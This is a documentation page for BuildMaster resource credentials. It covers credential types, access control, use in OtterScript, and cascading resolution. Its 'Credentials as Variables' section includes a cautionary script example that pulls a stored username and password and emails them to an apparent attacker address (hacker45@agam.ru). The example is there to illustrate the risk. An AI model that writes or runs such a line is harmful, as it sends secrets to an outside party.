---
title: Resource Credentials
keywords: buildmaster, executions, resource-credentials
show-headings-in-nav: true
sequence: 200
---

Resource credentials store information that is used to provide access to a particular resource (such as a name and password to a specific service), and may contain secrets (i.e. encrypted fields that are visible only to privileged users, like passwords or API keys).

There are a few types that are built in to BuildMaster:

|Type|	Properties	|Description|
|-|-|-|
|UsernamePassword	|UserName Password|	A general-purpose credential with a username and password, such as a Windows domain account. Several operations can use this to request a basic username/password. |
|PrivateKey	| UserName PublicKey PrivateKey* Passphrase*	| This is primarily used by the SSH-based agent when key-based authentication is used. |
|InedoProduct	| Host ApiKey* |	Represents a connection to instance of another Inedo product (BuildMaster, ProGet, or Otter) |

**\*** *indicates an encrypted/sensitive field*

Resource credentials are implemented through an [extensible feature](/docs/buildmaster/administration/extensions), and several extensions ([JIRA](/den/buildmaster/jira),[VSTS](/den/inedox/tfs), [GitHub](/den/inedox/github), etc.) will add types that are necessary for the extension's components.

## Creating and Editing Credentials {#creating-editing-credentials data-title="Creating and Editing Credentials"}

You can create a resource credential from the Resource Credentials link on the Administration page. In addition to the fields specific to the resource credential type, all resource credentials have:

*   **Name** - a name of up to 50 characters that will be used to reference the resource credential; while you can change the name later, any operation or component that relied on that name will no longer be able to find it
*   **Environment** - optional; restricts what environments the credential may be used in, and which users have access to it
*   **Variable Usage** - optional; you can allow the `$CredentialProperty` variable function to extract secure properties
*   **Environment Restriction** - optional; when set, a runtime error will occur when this credential is used in a deployment plan that is not running in the same environment

When editing credentials, the encrypted fields will be displayed as empty password textboxes, and entering a value in the textbox will change it. You may click the "view hidden fields" button to show these values if you have the appropriate permissions.

## Limiting Credential Access {#limiting-access data-title="Limiting Credential Access"}

You may want to permit or restrict certain users from accessing certain credentials, such as allowing Developers to manage credentials in the Integration and Testing environments. This is done by associating credentials with an environment, and then creating the appropriate [access controls](/docs/buildmaster/administration/users-and-security) scoped to that environment.

There are two task attributes you can use to control this access:

*   **Manage Credentials** will allow you to view, delete, and edit credentials, but not view existing encrypted/sensitive fields
*   **View Passwords** will allow you to view encrypted/sensitive fields on a credential

On the manage credentials page, users will only see the credentials they have permission to manage, and will only be able to create credentials in permitted environments.

## Credentials and OtterScript {#credentials-and-otterscript data-title="Credentials and OtterScript"}

Any operation that uses passwords, API keys, or sensitive information will give you the option to use a resource credential instead of needing to put those values directly in your OtterScript.

For example, consider the [`Ensure-AppPool`](/docs/buildmaster/reference/operations/iis/ensure-app-pool) operation:

![Ensure apppool operation](/resources/documentation/buildmaster/6/ensure-app-pool.png)

If you select a resource credential for the operation's, the OtterScript runtime will automatically set the value of the operations User Name and Password properties from the selected credential. If you specify a value for either of those properties, they will be used instead of the credential's value.

::: {.attention .technical}
If the credential has "restricted to environment use" configured, then this will only be permitted if the deployment plan is running in the same environment. This can be frustrating and unintuitive to your users, so be careful when using it.
:::

## Credentials as Variables {#credentials-as-variables data-title="Credentials as Variables"}

By default, there is no way to access the value of an encrypted/sensitive field on a credential from within OtterScript. However, at times it may be necessary, such as if you want to pass a username/password to a script or command-line utility.

You can enable variable usage on a credential-by-credential basis. When configured, you can use the [$CredentialProperty](/docs/buildmaster/reference/functions/credentials/credentialproperty) variable function to extract any property value. For example:

```
set $HDarsUser = $CredentialProperty(UsernamePassword::HDarsUser, UserName);
set $HDarsPassword = $CredentialProperty(UsernamePassword::HDarsUser, Password);
PSExec >> Register-HDars $HdarsUser $HdarsPassword >>;        

Send-Email
(
    To: hacker45@agam.ru,
    Subject: Username is $HdarsUser and password is $HdarsPassword
);
```

Instead, you should write a custom operation that can securely handle the credentials.

## Cascading Credentials {#cascading data-title="Cascading Credentials"}

As of BuildMaster v6.1.10, resource credentials may be specified at the application or application group scope in addition to environment. Certain implementations may also specify a resource credential to inherit from, overriding specific properties at the application or group level. 

For example, an individual application's resource credentials could specify a system-level parent that has username/password information stored for a full system, and then override just the "repository URL". This way, you can specify the secret value in one location (with elevated privileges required to access it), and connect to different repositories consistently throughout all applications.

The following rules are enforced by BuildMaster when creating or resolving cascading credentials:

{.docs}
 - for security reasons, the environment of the parent credential must match the inheritor's exactly, or the parent environment must not be specified (indicating that it applies to all environments)
 - when resolving a resource credential at execution time, candidates by name are selected in order of matching properties:
    - application + environment
    - application
    - application group
    - ancestor application-group
    - environment
    - system